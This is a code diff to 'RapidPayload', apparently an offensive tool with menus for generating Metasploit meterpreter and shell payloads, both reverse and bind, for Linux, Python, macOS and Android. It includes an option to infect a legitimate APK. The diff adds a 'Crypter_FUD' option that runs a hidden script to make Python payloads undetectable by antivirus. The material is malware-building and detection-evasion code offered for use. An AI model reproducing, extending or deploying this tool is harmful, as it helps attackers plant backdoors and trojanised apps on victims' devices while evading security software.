@@ -228,7 +228,7 @@ def Ngrok():
     print("\033[1m\033[36m")
     os.system("ls")	
     print("")
-    name1=input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
+    name1=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
     
     def index_defaultNgrok():
     
@@ -289,7 +289,7 @@ def localhost():
     print("\033[1m\033[36m")
     os.system("ls")	
     print("")
-    name2=input("\n{0}{1}RapidPayload:~/FileName# {2}".format(cyan, bold, end))
+    name2=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
     
     def index_defaultlocalhost():
     
@@ -356,7 +356,7 @@ def RapidP():
     if select == '2':       
         type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2} linux/x86/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2} linux/x86/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2} linux/x86/meterpreter/reverse_tcp{0}{1}\n{0}[{1}{2}4{0}]{1} {2} linux/x64/meterpreter/reverse_http{0}{1}\n{0}[{1}{2}5{0}]{1} {2} linux/x64/meterpreter/reverse_https{0}{1}\n{0}[{1}{2}6{0}]{1} {2} linux/x64/meterpreter/reverse_tcp\n{0}[{1}{2}7{0}]{1} {2} linux/x86/shell/reverse_tcp{0}\n{0}[{1}{2}8{0}]{1} {2} linux/x64/shell/bind_tcp\n{0}[{1}{2}9{0}]{1} {2} linux/x86/meterpreter/bind_tcp\n{0}[{1}{2}10{0}]{1} {2}linux/x64/meterpreter/bind_tcp\n{0}[{1}{2}11{0}]{1} {2}linux/x86/shell/bind_tcp\n{0}[{1}{2}12{0}]{1} {2}linux/x64/shell/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2} Menu\n\n{0}{2}RapidPayload:~/Linux#{1} '.format(cyan, end, bold))
         if type == '0':
-            RapidP()
+            RapidP()   
         main('Linux', type)
     if select == '3':
         droi = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}Normal\n{0}[{1}{2}2{0}]{1} {2}Infect Legitimate APK\n{0}{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
@@ -371,10 +371,20 @@ def RapidP():
                 RapidP()            
             legit('Android', type)            
     if select == '4':
-        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}python/meterpreter/bind_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}python/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}Crypter_FUD\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))
         if type == '0':
             RapidP()
-        main('Python', type)
+        elif type == '5':
+            print("\033[1m\033[36m")
+            os.system("ls")	
+            print("")
+            namepyfud=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
+            dirtt=os.getcwd()
+            os.system("chmod +x "+dirtt+"/Image/.py_fud.py")
+            os.system("python "+dirtt+"/Image/.py_fud.py "+namepyfud)
+            print("\n{0}{1}RapidPayload:~/Save#FUD_python_RapidPayload.py {2}".format(cyan, bold, end))                                          
+        else:             
+            main('Python', type)
     if select == '5':        
         type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}osx/x86/shell_reverse_tcp\n{0}[{1}{2}2{0}]{1} {2}osx/x86/shell_bind_tcp\n{0}[{1}{2}3{0}]{1} {2}osx/x64/meterpreter/bind_tcp\n{0}[{1}{2}4{0}]{1} {2}osx/x64/meterpreter/reverse_tcp\n{0}[{1}{2}5{0}]{1} {2}osx/x64/meterpreter_reverse_http\n{0}[{1}{2}6{0}]{1} {2}osx/x64/meterpreter_reverse_https\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/MacOS#{1} '.format(cyan, end, bold))
         if type == '0':
